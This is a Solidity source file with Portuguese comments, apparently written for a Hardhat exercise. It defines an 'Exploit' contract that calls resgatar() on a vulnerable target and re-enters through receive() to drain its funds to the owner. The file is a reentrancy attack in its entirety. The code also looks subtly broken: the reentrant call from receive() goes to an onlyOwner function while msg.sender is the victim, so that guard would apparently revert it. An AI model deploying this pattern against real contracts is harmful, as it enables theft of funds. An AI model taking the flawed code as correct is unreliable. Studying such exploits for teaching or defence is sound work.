// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

// Para poder usar console.log
import "hardhat/console.sol";

// Para poder imprimir como string
import '@openzeppelin/contracts/utils/Strings.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

interface IVulneravel {
    function resgatar() external;
}

contract Exploit is Ownable {
    using Strings for uint256;
    // using Strings for address;

    IVulneravel internal vulneravel;

    constructor(address _enderecoVulneravel) {
        vulneravel = IVulneravel(_enderecoVulneravel);
        console.log('contrato Exploit criado.');
    }

    function atacar() public onlyOwner {
        console.log('atacar()');
        vulneravel.resgatar();

        // Transfere todo o saldo deste contrato para o dono
        uint256 quantia = address(this).balance;
        (bool os, ) = payable(owner()).call{value: quantia}('');
        require(os);
        // console.log(string.concat('transferido ', quantia, ' para o dono ', owner()));
    }

    receive() external payable {
        // console.log(string.concat('Exploit recebeu', msg.value, ' wei.'));
        atacar();
    }
}
